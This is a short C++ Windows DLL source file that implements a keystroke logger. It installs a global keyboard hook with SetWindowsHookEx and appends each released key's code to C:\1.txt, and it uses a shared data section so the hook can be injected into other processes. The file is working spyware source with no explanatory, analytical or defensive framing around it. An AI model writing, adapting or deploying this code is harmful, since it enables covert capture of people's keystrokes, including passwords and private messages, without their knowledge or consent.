// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include"Win32Project2.h"
#pragma data_seg("WinHook")
HHOOK hook= NULL;
char c[1] = { 1 };
#pragma data_seg()
#pragma comment(linker,"/section:WinHook,RWES")
void writefile(char *c);
HINSTANCE instan=NULL;
LRESULT WINAPI LauncherHook(int nCode, WPARAM wParam, LPARAM lParam);
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		instan = hModule;
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
void instailhook(DWORD thread)
{
	hook = (HHOOK)SetWindowsHookEx(WH_KEYBOARD, LauncherHook, instan, thread);
}
LRESULT WINAPI LauncherHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		if (lParam & 0x80000000)
		{
			c[0] = wParam;
			writefile(c);
		}

	}
	return(CallNextHookEx(hook, nCode, wParam, lParam));
}
void writefile(char *c)
{
	LARGE_INTEGER a = { 0 };
	HANDLE file = CreateFile(TEXT("C:\\1.txt"), GENERIC_ALL, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	SetFilePointerEx(file, a, NULL, FILE_END);
	WriteFile(file, c, 1, NULL, NULL);
	CloseHandle(file);
}
